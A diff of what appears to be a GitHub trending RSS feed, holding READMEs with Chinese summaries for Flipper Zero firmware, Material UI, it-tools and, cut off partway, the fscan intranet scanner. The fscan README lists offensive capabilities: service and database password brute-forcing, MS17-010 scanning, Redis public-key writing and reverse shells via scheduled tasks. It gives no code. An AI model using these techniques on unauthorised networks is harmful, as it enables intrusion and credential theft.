@@ -4,6 +4,502 @@
 <title>GitHub All Languages Weekly Trending</title>
 <link>http://mshibanami.github.io/GitHubTrendingRSS</link>
 
+<item>
+<title>flipperdevices/flipperzero-firmware</title>
+<link>https://github.com/flipperdevices/flipperzero-firmware</link>
+<guid>https://github.com/flipperdevices/flipperzero-firmware</guid>
+<content:encoded><![CDATA[
+<div> 关键词：Flipper Zero Firmware、源代码、贡献、问题报告、代码提交
+
+总结:
+这篇文档详细介绍了如何获取、构建、测试和贡献到Flipper Zero的固件中。它首先强调了社区的价值，鼓励成员提出新想法和贡献。对于遇到问题的用户，推荐在社区论坛或GitHub页面上寻找答案。如果用户希望报告问题，文档提供了详细的指南，包括描述应包含的信息。对于想要贡献代码的开发者，文档建议先确认更改是否适合固件，并遵循社区的指导原则。此外，文档还概述了支持的开发平台和调试器，以及构建固件的基本步骤，包括使用Flipper Build Tool进行构建和烧录。最后，文档提供了一个结构化的项目目录，帮助开发者理解固件的组织方式。 <div>
+<p>Flipper Zero firmware source code</p><hr /> 
+ <source media="(prefers-color-scheme: dark)" /> 
+ <source media="(prefers-color-scheme: light)" /> 
+ <img alt="A pixel art of a Dophin with text: Flipper Zero Official Repo" src="https://raw.githubusercontent.com/flipperdevices/flipperzero-firmware/dev/.github/assets/light_theme_banner.png" /> 
+ 
+<h1>Flipper Zero Firmware</h1> 
+<ul> 
+ <li><a href="https://flipperzero.one">Flipper Zero Official Website</a>. A simple way to explain to your friends what Flipper Zero can do.</li> 
+ <li><a href="https://update.flipperzero.one">Flipper Zero Firmware Update</a>. Improvements for your dolphin: latest firmware releases, upgrade tools for PC and mobile devices.</li> 
+ <li><a href="https://docs.flipperzero.one">User Documentation</a>. Learn more about your dolphin: specs, usage guides, and anything you want to ask.</li> 
+ <li><a href="https://developer.flipper.net/flipperzero/doxygen">Developer Documentation</a>. Dive into the Flipper Zero Firmware source code: build system, firmware structure, and more.</li> 
+</ul> 
+<h1>Contributing</h1> 
+<p>Our main goal is to build a healthy and sustainable community around Flipper, so we're open to any new ideas and contributions. We also have some rules and taboos here, so please read this page and our <a href="https://raw.githubusercontent.com/flipperdevices/flipperzero-firmware/dev/CODE_OF_CONDUCT.md">Code of Conduct</a> carefully.</p> 
+<h2>I need help</h2> 
+<p>The best place to search for answers is our <a href="https://docs.flipperzero.one">User Documentation</a>. If you can't find the answer there, check our <a href="https://flipp.dev/discord">Discord Server</a> or our <a href="https://forum.flipperzero.one/">Forum</a>. If you want to contribute to the firmware development, or modify it for your own needs, you can also check our <a href="https://developer.flipper.net/flipperzero/doxygen">Developer Documentation</a>.</p> 
+<h2>I want to report an issue</h2> 
+<p>If you've found an issue and want to report it, please check our <a href="https://github.com/flipperdevices/flipperzero-firmware/issues">Issues</a> page. Make sure the description contains information about the firmware version you're using, your platform, and a clear explanation of the steps to reproduce the issue.</p> 
+<h2>I want to contribute code</h2> 
+<p>Before opening a PR, please confirm that your changes must be contained in the firmware. Many ideas can easily be implemented as external applications and published in the <a href="https://github.com/flipperdevices/flipper-application-catalog">Flipper Application Catalog</a>. If you are unsure, reach out to us on the <a href="https://flipp.dev/discord">Discord Server</a> or the <a href="https://github.com/flipperdevices/flipperzero-firmware/issues">Issues</a> page, and we'll help you find the right place for your code.</p> 
+<p>Also, please read our <a href="https://raw.githubusercontent.com/flipperdevices/flipperzero-firmware/dev/CONTRIBUTING.md">Contribution Guide</a> and our <a href="https://raw.githubusercontent.com/flipperdevices/flipperzero-firmware/dev/CODING_STYLE.md">Coding Style</a>, and make sure your code is compatible with our <a href="https://raw.githubusercontent.com/flipperdevices/flipperzero-firmware/dev/LICENSE">Project License</a>.</p> 
+<p>Finally, open a <a href="https://github.com/flipperdevices/flipperzero-firmware/pulls">Pull Request</a> and make sure that CI/CD statuses are all green.</p> 
+<h1>Development</h1> 
+<p>Flipper Zero Firmware is written in C, with some bits and pieces written in C++ and armv7m assembly languages. An intermediate level of C knowledge is recommended for comfortable programming. C, C++, and armv7m assembly languages are supported for Flipper applications.</p> 
+<h1>Firmware RoadMap</h1> 
+<p><a href="https://miro.com/app/board/uXjVO_3D6xU=/">Firmware RoadMap Miro Board</a></p> 
+<h2>Requirements</h2> 
+<p>Supported development platforms:</p> 
+<ul> 
+ <li>Windows 10+ with PowerShell and Git (x86_64)</li> 
+ <li>macOS 12+ with Command Line tools (x86_64, arm64)</li> 
+ <li>Ubuntu 20.04+ with build-essential and Git (x86_64)</li> 
+</ul> 
+<p>Supported in-circuit debuggers (optional but highly recommended):</p> 
+<ul> 
+ <li><a href="https://shop.flipperzero.one/products/wifi-devboard">Flipper Zero Wi-Fi Development Board</a></li> 
+ <li>CMSIS-DAP compatible: Raspberry Pi Debug Probe and etc...</li> 
+ <li>ST-Link (v2, v3, v3mods)</li> 
+ <li>J-Link</li> 
+</ul> 
+<p>Flipper Build System will take care of all the other dependencies.</p> 
+<h2>Cloning source code</h2> 
+<p>Make sure you have enough space and clone the source code:</p> 
+<pre><code class="language-shell">git clone --recursive https://github.com/flipperdevices/flipperzero-firmware.git
+</code></pre> 
+<h2>Building</h2> 
+<p>Build firmware using Flipper Build Tool:</p> 
+<pre><code class="language-shell">./fbt
+</code></pre> 
+<h2>Flashing firmware using an in-circuit debugger</h2> 
+<p>Connect your in-circuit debugger to your Flipper and flash firmware using Flipper Build Tool:</p> 
+<pre><code class="language-shell">./fbt flash
+</code></pre> 
+<h2>Flashing firmware using USB</h2> 
+<p>Make sure your Flipper is on, and your firmware is functioning. Connect your Flipper with a USB cable and flash firmware using Flipper Build Tool:</p> 
+<pre><code class="language-shell">./fbt flash_usb
+</code></pre> 
+<h2>Documentation</h2> 
+<ul> 
+ <li><a href="https://raw.githubusercontent.com/flipperdevices/flipperzero-firmware/dev/documentation/fbt.md">Flipper Build Tool</a> - building, flashing, and debugging Flipper software</li> 
+ <li><a href="https://raw.githubusercontent.com/flipperdevices/flipperzero-firmware/dev/documentation/AppsOnSDCard.md">Applications</a>, <a href="https://raw.githubusercontent.com/flipperdevices/flipperzero-firmware/dev/documentation/AppManifests.md">Application Manifest</a> - developing, building, deploying, and debugging Flipper applications</li> 
+ <li><a href="https://raw.githubusercontent.com/flipperdevices/flipperzero-firmware/dev/documentation/KeyCombo.md">Hardware combos and Un-bricking</a> - recovering your Flipper from the most nasty situations</li> 
+ <li><a href="https://raw.githubusercontent.com/flipperdevices/flipperzero-firmware/dev/documentation/file_formats">Flipper File Formats</a> - everything about how Flipper stores your data and how you can work with it</li> 
+ <li><a href="https://raw.githubusercontent.com/flipperdevices/flipperzero-firmware/dev/documentation/UniversalRemotes.md">Universal Remotes</a> - contributing your infrared remote to the universal remote database</li> 
+ <li><a href="https://miro.com/app/board/uXjVO_3D6xU=/">Firmware Roadmap</a></li> 
+ <li>And much more in the <a href="https://developer.flipper.net/flipperzero/doxygen">Developer Documentation</a></li> 
+</ul> 
+<h1>Project structure</h1> 
+<ul> 
+ <li><code>applications</code> - Applications and services used in firmware</li> 
+ <li><code>applications_users</code> - Place for your additional applications and services</li> 
+ <li><code>assets</code> - Assets used by applications and services</li> 
+ <li><code>documentation</code> - Documentation generation system configs and input files</li> 
+ <li><code>furi</code> - Furi Core: OS-level primitives and helpers</li> 
+ <li><code>lib</code> - Our and 3rd party libraries, drivers, tools and etc...</li> 
+ <li><code>site_scons</code> - Build system configuration and modules</li> 
+ <li><code>scripts</code> - Supplementary scripts and various python libraries</li> 
+ <li><code>targets</code> - Firmware targets: platform specific code</li> 
+</ul> 
+<p>Also, see <code>ReadMe.md</code> files inside those directories for further details.</p> 
+<h1>Links</h1> 
+<ul> 
+ <li>Discord: <a href="https://flipp.dev/discord">flipp.dev/discord</a></li> 
+ <li>Website: <a href="https://flipperzero.one">flipperzero.one</a></li> 
+ <li>Forum: <a href="https://forum.flipperzero.one/">forum.flipperzero.one</a></li> 
+ <li>Kickstarter: <a href="https://www.kickstarter.com/projects/flipper-devices/flipper-zero-tamagochi-for-hackers">kickstarter.com</a></li> 
+</ul>
+]]></content:encoded>
+
+
+</item>
+<item>
+<title>mui/material-ui</title>
+<link>https://github.com/mui/material-ui</link>
+<guid>https://github.com/mui/material-ui</guid>
+<content:encoded><![CDATA[
+<div> 关键词：Material UI、React组件库、Google的Material Design、免费、Joy UI
+
+总结:
+
+Material UI是一个由React组件组成的全面库，它基于Google的Material Design系统进行独立实现。这个库因其经过多年开发和数千名开源贡献者的实战检验而受到全球顶级产品团队的信任。除了核心功能外，Material UI还提供了一套用于复杂场景的高级组件，以扩展其核心功能。
+
+Joy UI是该仓库中包含的一个实验性组件库，它采用了内部的Joy设计系统。尽管Joy UI处于beta阶段且开发目前暂停，但对于新项目而言，推荐使用Material UI而不是Joy UI，因为后者能够提供持续的支持。
+
+对于如何开始使用Material UI的问题，可以参考其官方文档。此外，项目提供了不同版本的资源链接，以及赞助者列表，包括钻石赞助、金牌赞助等。对于代码之外的问题，建议使用社区论坛或邮件列表进行提问。
+
+关于安全问题，项目提供了详细的版本支持信息和报告安全漏洞的联系方式。同时，项目得到了多个服务的赞助，如GitHub、Netlify、Cypress.io和Codecov.io，这些服务分别负责代码托管、文档生成、自动化测试和代码覆盖率监控等核心基础设施的运行。 <div>
+<p>Material UI: Comprehensive React component library that implements Google's Material Design. Free forever.</p><hr /><p align="center"> <a href="https://mui.com/core/" rel="noopener" target="_blank"><img alt="Material&nbsp;UI logo" height="133" src="https://mui.com/static/logo.svg?sanitize=true" width="150" /></a> </p> 
+<h1 align="center">Material&nbsp;UI</h1> 
+<div align="center"> 
+ <p><a href="https://github.com/mui/material-ui/raw/HEAD/LICENSE"><img alt="license" src="https://img.shields.io/badge/license-MIT-blue.svg?sanitize=true" /></a> <a href="https://www.npmjs.com/package/@mui/material"><img alt="npm latest package" src="https://img.shields.io/npm/v/@mui/material/latest.svg?sanitize=true" /></a> <a href="https://www.npmjs.com/package/@mui/material"><img alt="npm next package" src="https://img.shields.io/npm/v/@mui/material/next.svg?sanitize=true" /></a> <a href="https://www.npmjs.com/package/@mui/material"><img alt="npm downloads" src="https://img.shields.io/npm/dm/@mui/material.svg?sanitize=true" /></a> <a href="https://github.com/mui/material-ui/commits/HEAD/"><img alt="GitHub branch status" src="https://img.shields.io/github/checks-status/mui/material-ui/HEAD" /></a> <a href="https://app.codecov.io/gh/mui/material-ui/"><img alt="Coverage Status" src="https://img.shields.io/codecov/c/github/mui/material-ui.svg?sanitize=true" /></a> <a href="https://x.com/MaterialUI"><img alt="Follow on X" src="https://img.shields.io/twitter/follow/MaterialUI.svg?label=follow+Material+UI" /></a> <a href="https://github.com/mui/material-ui/issues/27062"><img alt="Renovate status" src="https://img.shields.io/badge/renovate-enabled-brightgreen.svg?sanitize=true" /></a> <a href="https://isitmaintained.com/project/mui/material-ui" title="Average time to resolve an issue"><img alt="Average time to resolve an issue" src="https://isitmaintained.com/badge/resolution/mui/material-ui.svg?sanitize=true" /></a> <a href="https://opencollective.com/mui-org"><img alt="Open&nbsp;Collective backers and sponsors" src="https://img.shields.io/opencollective/all/mui-org" /></a> <a href="https://bestpractices.coreinfrastructure.org/projects/1320"><img alt="CII Best Practices" src="https://bestpractices.coreinfrastructure.org/projects/1320/badge" /></a></p> 
+</div> 
+<p><a href="https://mui.com/material-ui/">Material&nbsp;UI</a> is a comprehensive library of React components that features our independent implementation of Google's <a href="https://m2.material.io/design/introduction/">Material Design</a> system. It's trusted by some of the world's greatest product teams because it's been rigorously battle-tested through more than a decade of development by thousands of open-source contributors.</p> 
+<p>Material&nbsp;UI's core functionality is extended by <a href="https://github.com/mui/mui-x">MUI&nbsp;X</a>, a suite of complex components for advanced use cases.</p> 
+<h2>Documentation</h2> 
+<p>Get started in the <a href="https://mui.com/material-ui/getting-started/">Material&nbsp;UI documentation</a>.</p> 
+<details> 
+ Older versions 
+ <ul> 
+  <li><strong><a href="https://v5.mui.com/">v5.x</a></strong> (<a href="https://mui.com/material-ui/migration/upgrade-to-v6/">Upgrading from v5 to v6</a>)</li> 
+  <li><strong><a href="https://v4.mui.com/">v4.x</a></strong> (<a href="https://mui.com/material-ui/migration/migration-v4/">Upgrading from v4 to v5</a>)</li> 
+  <li><strong><a href="https://v3.mui.com/">v3.x</a></strong> (<a href="https://mui.com/material-ui/migration/migration-v3/">Upgrading from v3 to v4</a>)</li> 
+  <li><strong><a href="https://v0.mui.com/">v0.x</a></strong> (<a href="https://mui.com/material-ui/migration/migration-v0x/">Upgrading to v1</a>)</li> 
+ </ul> 
+</details> 
+<p><strong>Note:</strong> <code>@next</code> points to pre-releases. Use <code>@latest</code> for the latest stable release.</p> 
+<h2>Joy UI</h2> 
+<p>This repository also contains Joy UI, an experimental component library that implements our own in-house Joy Design. Joy UI is in beta and <em>development is currently on hold</em>. When starting a new project from scratch, we recommend Material&nbsp;UI over Joy UI because we can guarantee ongoing support.</p> 
+<p>You're welcome to open new issues and PRs to help improve Joy UI, but please keep in mind that the maintainers are primarily focused on other projects and may not be able to respond in a timely manner.</p> 
+<p>View the <a href="https://mui.com/joy-ui/getting-started/">Joy UI documentation</a>.</p> 
+<h2>Sponsors</h2> 
+<h3>Diamond 💎</h3> 
+<p> <a href="https://octopus.com/?utm_source=MUI&amp;utm_medium=referral&amp;utm_content=readme" rel="noopener sponsored" target="_blank"><img alt="octopus" height="128" src="https://mui.com/static/sponsors/octopus-square.svg?sanitize=true" title="Repeatable, reliable deployments" width="128" /></a> <a href="https://www.doit.com/?utm_source=MUI&amp;utm_medium=referral&amp;utm_content=readme" rel="noopener sponsored" target="_blank"><img alt="doit" height="128" src="https://mui.com/static/sponsors/doit-square.svg?sanitize=true" title="Management Platform for Google Cloud and AWS" width="128" /></a> <a href="https://www.marblism.com/?utm_source=mui" rel="noopener sponsored" target="_blank"><img alt="marblism" height="128" src="https://mui.com/static/sponsors/marblism-square.svg?sanitize=true" title="AI web app generation" width="128" /></a> </p> 
+<p>Diamond sponsors are those who have pledged $1,500/month or more to MUI.</p> 
+<h3>Gold 🏆</h3> 
+<p>via <a href="https://opencollective.com/mui-org">Open&nbsp;Collective</a> or via <a href="https://www.patreon.com/oliviertassinari">Patreon</a></p> 
+<p> <a href="https://tidelift.com/subscription/pkg/npm-material-ui?utm_source=npm-material-ui&amp;utm_medium=referral&amp;utm_campaign=homepage" rel="noopener sponsored" target="_blank"><img alt="tidelift.com" height="96" src="https://avatars.githubusercontent.com/u/30204434?s=288" title="Tidelift: Enterprise-ready open-source software." width="96" /></a> <a href="https://open.spotify.com/?utm_source=MUI&amp;utm_medium=referral&amp;utm_content=readme" rel="noopener sponsored" target="_blank"><img alt="Spotify" height="96" src="https://avatars.githubusercontent.com/u/251374?s=288" title="Spotify: Music service for accessing millions of songs." width="96" /></a> <a href="https://icons8.com?utm_source=MUI&amp;utm_medium=referral&amp;utm_content=readme" rel="noopener sponsored" target="_blank"><img alt="Icons8" height="96" src="https://images.opencollective.com/icons8/7fa1641/logo/288.png" title="Icons8: API for icons, photos, illustrations, and music." width="96" /></a> <a href="https://rxdb.info/?utm_source=sponsor&amp;utm_medium=opencollective&amp;utm_campaign=opencollective-mui" rel="noopener sponsored" target="_blank"><img alt="RxDB" height="96" src="https://rxdb.info/files/logo/logo_text.svg?sanitize=true" title="RxDB: Local-first JavaScript database." width="96" /></a> <a href="https://www.text-em-all.com/?utm_source=MUI&amp;utm_medium=referral&amp;utm_content=readme" rel="noopener sponsored" target="_blank"><img alt="text-em-all.com" height="96" src="https://avatars.githubusercontent.com/u/1262264?s=288" title="Text-em-all: Mass text messaging and automated calling." width="96" /></a> <a href="https://megafamous.com/?utm_source=MUI&amp;utm_medium=referral&amp;utm_content=readme" rel="noopener sponsored" target="_blank"><img alt="megafamous.com" height="96" src="https://mui.com/static/sponsors/megafamous.png" title="MegaFamous: Buy Instagram followers and likes." width="96" /></a> <a href="https://www.dialmycalls.com/?utm_source=MUI&amp;utm_medium=referral&amp;utm_content=readme" rel="noopener sponsored" target="_blank"><img alt="dialmycalls.com" height="96" src="https://images.opencollective.com/dialmycalls/f5ae9ab/avatar/288.png" title="DialMyCalls: Send text messages, calls, and emails." width="96" /></a> <a href="https://goread.io/?utm_source=MUI&amp;utm_medium=referral&amp;utm_content=readme" rel="noopener sponsored" target="_blank"><img alt="goread.io" height="96" src="https://images.opencollective.com/goread_io/eb6337d/logo/288.png" title="Goread.io: Instagram followers, likes, views, and comments." width="96" /></a> <a href="https://copycopter.ai/?utm_source=MUI&amp;utm_medium=referral&amp;utm_content=readme" rel="noopener sponsored" target="_blank"><img alt="copycopter.ai" height="96" src="https://images.opencollective.com/copycopterai/e167216/logo/288.png" title="CopyCopter: Turn prompts into videos at ultra speed." width="96" /></a> </p> 
+<p> <a href="https://buzzoid.com/?utm_source=MUI&amp;utm_medium=referral&amp;utm_content=readme" rel="noopener sponsored" style="margin-right: 8px;" target="_blank"><img alt="buzzoid.com" height="24" src="https://images.opencollective.com/buzzoidz/d23d9bb/logo/24.png" style="margin-right: 8px;" title="Buzzoid: Instant delivery Instagram followers." width="26" />Buzzoid</a> <a href="https://twicsy.com/?utm_source=MUI&amp;utm_medium=referral&amp;utm_content=readme" rel="noopener sponsored" style="margin-right: 8px;" target="_blank"><img alt="twicsy.com" height="24" src="https://images.opencollective.com/twicsy/7af290f/logo/24.png" style="margin-right: 8px;" title="Twicsy: Instant delivery Instagram followers." width="27" />Twicsy</a> </p> 
+<p>Gold sponsors are those who have pledged $500/month or more to MUI.</p> 
+<h3>More backers</h3> 
+<p>See the full list of <a href="https://mui.com/material-ui/discover-more/backers/">our backers</a>.</p> 
+<h2>Questions</h2> 
+<p>For how-to questions that don't involve making changes to the code base, please use <a href="https://stackoverflow.com/questions/">Stack&nbsp;Overflow</a> instead of GitHub issues.</p> 
+<h2>Examples</h2> 
+<p>Our documentation features <a href="https://github.com/mui/material-ui/tree/master/examples">a collection of example projects</a>.</p> 
+<h2>Premium templates</h2> 
+<p>You can find complete templates and themes in the <a href="https://mui.com/store/?utm_source=docs&amp;utm_medium=referral&amp;utm_campaign=readme-store">MUI&nbsp;Store</a>.</p> 
+<h2>Contributing</h2> 
+<p>Read the <a href="https://raw.githubusercontent.com/mui/material-ui/master/CONTRIBUTING.md">contributing guide</a> to learn about our development process, how to propose bug fixes and improvements, and how to build and test your changes.</p> 
+<p>Contributing is about more than just issues and pull requests! There are many other ways to <a href="https://mui.com/material-ui/getting-started/faq/#mui-is-an-awesome-organization-how-can-i-support-it">support Material&nbsp;UI</a> beyond contributing to the code base.</p> 
+<h2>Changelog</h2> 
+<p>The <a href="https://github.com/mui/material-ui/releases">changelog</a> is regularly updated to reflect what's changed in each new release.</p> 
+<h2>Roadmap</h2> 
+<p>Future plans and high-priority features and enhancements can be found in the <a href="https://mui.com/material-ui/discover-more/roadmap/">roadmap</a>.</p> 
+<h2>License</h2> 
+<p>This project is licensed under the terms of the <a href="https://raw.githubusercontent.com/mui/material-ui/master/LICENSE">MIT license</a>.</p> 
+<h2>Security</h2> 
+<p>For details on supported versions and contact information for reporting security issues, please refer to the <a href="https://github.com/mui/material-ui/security/policy">security policy</a>.</p> 
+<h2>Sponsoring services</h2> 
+<p>These great services sponsor MUI's core infrastructure:</p> 
+<div> 
+  
+  <source media="(prefers-color-scheme: dark)" /> 
+  <source media="(prefers-color-scheme: light)" /> 
+  <img alt="GitHub logo" height="43" src="https://mui.com/static/readme/github-lightmode.svg?sanitize=true" width="80" /> 
+  
+ <p><a href="https://github.com/">GitHub</a> lets us host the Git repository and coordinate contributions.</p> 
+</div> 
+<div> 
+  
+  <source media="(prefers-color-scheme: dark)" /> 
+  <source media="(prefers-color-scheme: light)" /> 
+  <img alt="Netlify logo" height="27" src="https://mui.com/static/readme/netlify-lightmode.svg?sanitize=true" width="100" /> 
+  
+ <p><a href="https://www.netlify.com/">Netlify</a> lets us distribute the documentation.</p> 
+</div> 
+<div> 
+  
+  <source media="(prefers-color-scheme: dark)" /> 
+  <source media="(prefers-color-scheme: light)" /> 
+  <img alt="BrowserStack logo" height="25" src="https://mui.com/static/readme/browserstack-lightmode.svg?sanitize=true" width="140" /> 
+  
+ <p><a href="https://www.browserstack.com/">BrowserStack</a> lets us test in real browsers.</p> 
+</div> 
+<div> 
+ <img alt="CodeCov logo" height="35" src="https://avatars.githubusercontent.com/u/8226205?s=105" width="35" /> 
+ <p><a href="https://about.codecov.io/">CodeCov</a> lets us monitor test coverage.</p> 
+</div>
+]]></content:encoded>
+
+
+</item>
+<item>
+<title>CorentinTh/it-tools</title>
+<link>https://github.com/CorentinTh/it-tools</link>
+<guid>https://github.com/CorentinTh/it-tools</guid>
+<content:encoded><![CDATA[
+<div> 关键词：在线工具、开发者、用户体验、自我托管、贡献
+
+总结:
+
+本文介绍了一系列专为开发者和IT工作者设计的高效在线工具，旨在提升工作流程与用户体验。这些工具不仅功能丰富，还提供了清晰的功能规划，方便用户了解未来更新的方向。对于希望自托管的用户，文章提供了从Docker Hub和GitHub Packages部署工具的详细步骤，使用户能够轻松将这些工具集成到自己的基础设施中。
+
+为了促进更好的开发体验，文章推荐了特定的IDE设置和扩展，如VSCode的配置示例，以优化代码编辑、自动格式化、国际化支持等关键方面。此外，考虑到Vue组件在类型支持上的特殊需求，文章介绍了如何通过替换编译器及启用特定插件来解决这一问题，以提升开发效率。
+
+项目结构与构建流程被详细阐述，通过使用pnpm进行依赖管理、开发、生产构建、测试和代码检查，确保了项目的高效管理和质量控制。创建新工具的指南鼓励社区参与，通过提供模板和文档简化工具开发过程，促进知识共享和创新。
+
+最后，文章强调了贡献的重要性，并对所有已做出贡献的开发者表示感谢，同时展示了项目的技术栈和部署策略，以及使用开源工具生成贡献者图谱，体现了开放合作的精神。整个项目遵循特定的许可证协议，确保了透明度和可持续性。
+
+通过以上描述，可以看出本文围绕着一系列面向开发者和IT工作者的在线工具，从工具功能、部署、开发流程、社区贡献等多个维度进行了全面介绍，旨在打造一个高效、灵活且充满活力的开发者生态系统。 <div>
+<p>Collection of handy online tools for developers, with great UX.</p><hr /> 
+ <source media="(prefers-color-scheme: light)" /> 
+ <source media="(prefers-color-scheme: dark)" /> 
+ <img alt="logo" src="https://raw.githubusercontent.com/CorentinTh/it-tools/main/.github/logo-dark.png" /> 
+ 
+<p>Useful tools for developer and people working in IT. <a href="https://it-tools.tech">Have a look !</a>.</p> 
+<h2>Functionalities and roadmap</h2> 
+<p>Please check the <a href="https://github.com/CorentinTh/it-tools/issues">issues</a> to see if some feature listed to be implemented.</p> 
+<p>You have an idea of a tool? Submit a <a href="https://github.com/CorentinTh/it-tools/issues/new/choose">feature request</a>!</p> 
+<h2>Self host</h2> 
+<p>Self host solutions for your homelab</p> 
+<p><strong>From docker hub:</strong></p> 
+<pre><code class="language-sh">docker run -d --name it-tools --restart unless-stopped -p 8080:80 corentinth/it-tools:latest
+</code></pre> 
+<p><strong>From github packages:</strong></p> 
+<pre><code class="language-sh">docker run -d --name it-tools --restart unless-stopped -p 8080:80 ghcr.io/corentinth/it-tools:latest
+</code></pre> 
+<p><strong>Other solutions:</strong></p> 
+<ul> 
+ <li><a href="https://www.cloudron.io/store/tech.ittools.cloudron.html">Cloudron</a></li> 
+ <li><a href="https://www.runtipi.io/docs/apps-available">Tipi</a></li> 
+ <li><a href="https://unraid.net/community/apps?q=it-tools">Unraid</a></li> 
+</ul> 
+<h2>Contribute</h2> 
+<h3>Recommended IDE Setup</h3> 
+<p><a href="https://code.visualstudio.com/">VSCode</a> with the following extensions:</p> 
+<ul> 
+ <li><a href="https://marketplace.visualstudio.com/items?itemName=Vue.volar">Volar</a> (and disable Vetur)</li> 
+ <li><a href="https://marketplace.visualstudio.com/items?itemName=Vue.vscode-typescript-vue-plugin">TypeScript Vue Plugin (Volar)</a>.</li> 
+ <li><a href="https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint">ESLint</a></li> 
+ <li><a href="https://marketplace.visualstudio.com/items?itemName=lokalise.i18n-ally">i18n Ally</a></li> 
+</ul> 
+<p>with the following settings:</p> 
+<pre><code class="language-json">{
+  "editor.formatOnSave": false,
+  "editor.codeActionsOnSave": {
+    "source.fixAll.eslint": true
+  },
+  "i18n-ally.localesPaths": ["locales", "src/tools/*/locales"],
+  "i18n-ally.keystyle": "nested"
+}
+</code></pre> 
+<h3>Type Support for <code>.vue</code> Imports in TS</h3> 
+<p>TypeScript cannot handle type information for <code>.vue</code> imports by default, so we replace the <code>tsc</code> CLI with <code>vue-tsc</code> for type checking. In editors, we need <a href="https://marketplace.visualstudio.com/items?itemName=Vue.vscode-typescript-vue-plugin">TypeScript Vue Plugin (Volar)</a> to make the TypeScript language service aware of <code>.vue</code> types.</p> 
+<p>If the standalone TypeScript plugin doesn't feel fast enough to you, Volar has also implemented a <a href="https://github.com/johnsoncodehk/volar/discussions/471#discussioncomment-1361669">Take Over Mode</a> that is more performant. You can enable it by the following steps:</p> 
+<ol> 
+ <li>Disable the built-in TypeScript Extension 
+  <ol> 
+   <li>Run <code>Extensions: Show Built-in Extensions</code> from VSCode's command palette</li> 
+   <li>Find <code>TypeScript and JavaScript Language Features</code>, right click and select <code>Disable (Workspace)</code></li> 
+  </ol> </li> 
+ <li>Reload the VSCode window by running <code>Developer: Reload Window</code> from the command palette.</li> 
+</ol> 
+<h3>Project Setup</h3> 
+<pre><code class="language-sh">pnpm install
+</code></pre> 
+<h3>Compile and Hot-Reload for Development</h3> 
+<pre><code class="language-sh">pnpm dev
+</code></pre> 
+<h3>Type-Check, Compile and Minify for Production</h3> 
+<pre><code class="language-sh">pnpm build
+</code></pre> 
+<h3>Run Unit Tests with <a href="https://vitest.dev/">Vitest</a></h3> 
+<pre><code class="language-sh">pnpm test
+</code></pre> 
+<h3>Lint with <a href="https://eslint.org/">ESLint</a></h3> 
+<pre><code class="language-sh">pnpm lint
+</code></pre> 
+<h3>Create a new tool</h3> 
+<p>To create a new tool, there is a script that generate the boilerplate of the new tool, simply run:</p> 
+<pre><code class="language-sh">pnpm run script:create:tool my-tool-name
+</code></pre> 
+<p>It will create a directory in <code>src/tools</code> with the correct files, and a the import in <code>src/tools/index.ts</code>. You will just need to add the imported tool in the proper category and develop the tool.</p> 
+<h2>Contributors</h2> 
+<p>Big thanks to all the people who have already contributed!</p> 
+<p><a href="https://github.com/corentinth/it-tools/graphs/contributors"><img alt="contributors" src="https://contrib.rocks/image?repo=corentinth/it-tools" /></a></p> 
+<h2>Credits</h2> 
+<p>Coded with ❤️ by <a href="https://raw.githubusercontent.com/corentin-thomasset.fr">Corentin Thomasset</a>.</p> 
+<p>This project is continuously deployed using <a href="https://vercel.com">vercel.com</a>.</p> 
+<p>Contributor graph is generated using <a href="https://contrib.rocks/preview?repo=corentinth/it-tools">contrib.rocks</a>.</p> 
+<p><a href="https://www.producthunt.com/posts/it-tools?utm_source=badge-featured&amp;utm_medium=badge&amp;utm_souce=badge-it-tools" target="_blank"><img alt="IT Tools - Collection of handy online tools for devs, with great UX | Product Hunt" height="54" src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=345793&amp;theme=light" style="width: 250px; height: 54px;" width="250" /></a> <a href="https://www.producthunt.com/posts/it-tools?utm_source=badge-top-post-badge&amp;utm_medium=badge&amp;utm_souce=badge-it-tools" target="_blank"><img alt="IT Tools - Collection of handy online tools for devs, with great UX | Product Hunt" height="54" src="https://api.producthunt.com/widgets/embed-image/v1/top-post-badge.svg?post_id=345793&amp;theme=light&amp;period=daily" style="width: 250px; height: 54px;" width="250" /></a></p> 
+<h2>License</h2> 
+<p>This project is under the <a href="https://raw.githubusercontent.com/CorentinTh/it-tools/main/LICENSE">GNU GPLv3</a>.</p>
+]]></content:encoded>
+
+
+</item>
+<item>
+<title>shadow1ng/fscan</title>
+<link>https://github.com/shadow1ng/fscan</link>
+<guid>https://github.com/shadow1ng/fscan</guid>
+<content:encoded><![CDATA[
+<div> 关键词：fscan、内网综合扫描工具、自动化、全方位漏扫扫描、一键操作
+
+总结:
+fscan是一款强大的内网综合扫描工具，旨在提供自动化、全方位的漏扫扫描解决方案。其核心功能包括信息搜集、爆破功能、系统信息与漏洞扫描、Web探测与Web漏洞扫描、漏洞利用以及其它辅助功能。用户可通过多种命令行参数灵活配置扫描需求，实现从存活探测、端口扫描、服务爆破、系统信息收集到高危漏洞检测、Web指纹识别、Web漏洞扫描等一系列操作。此外，fscan支持自定义参数以适应不同场景需求，如跳过特定步骤、调整扫描速度、指定目标范围、选择特定扫描模式等，确保扫描过程高效且精准。通过fscan，用户能够快速定位并解决网络内部的安全隐患，提升网络安全性。 <div>
+<p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</p><hr /><h1>fscan</h1> 
+<p><a href="https://raw.githubusercontent.com/shadow1ng/fscan/main/README_EN.md">English</a></p> 
+<h1>1. 简介</h1> 
+<p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。<br /> 支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p> 
+<h1>2. 主要功能</h1> 
+<p>1.信息搜集:</p> 
+<ul> 
+ <li>存活探测(icmp)</li> 
+ <li>端口扫描</li> 
+</ul> 
+<p>2.爆破功能:</p> 
+<ul> 
+ <li>各类服务爆破(ssh、smb、rdp等)</li> 
+ <li>数据库密码爆破(mysql、mssql、redis、psql、oracle等)</li> 
+</ul> 
+<p>3.系统信息、漏洞扫描:</p> 
+<ul> 
+ <li>netbios探测、域控识别</li> 
+ <li>获取目标网卡信息</li> 
+ <li>高危漏洞扫描(ms17010等)</li> 
+</ul> 
+<p>4.Web探测功能:</p> 
+<ul> 
+ <li>webtitle探测</li> 
+ <li>web指纹识别(常见cms、oa框架等)</li> 
